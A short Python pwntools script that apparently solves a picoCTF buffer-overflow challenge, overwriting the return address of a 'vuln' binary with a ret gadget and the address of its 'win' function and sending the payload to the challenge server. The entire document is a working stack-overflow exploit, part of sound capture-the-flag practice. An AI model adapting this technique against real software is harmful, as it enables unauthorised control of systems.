from pwn import *

elf = ELF('vuln', checksec=True)

win_addr = elf.symbols['win']
print(hex(win_addr))
offset_to_fill = 0x28+4  # address of the variable to overflow + 4 instruction pointer
# ret below is not neccessary all the time but seems like it will still work if its not needed, while some specific libc needs it (see x64) so just add to be sure
rop = ROP(elf)
ret = (rop.find_gadget(['ret']))[0]

io = remote('saturn.picoctf.net', 58633)
payload = b'A' * offset_to_fill + p32(ret) + p32(win_addr)
io.sendline(payload)
io.interactive()
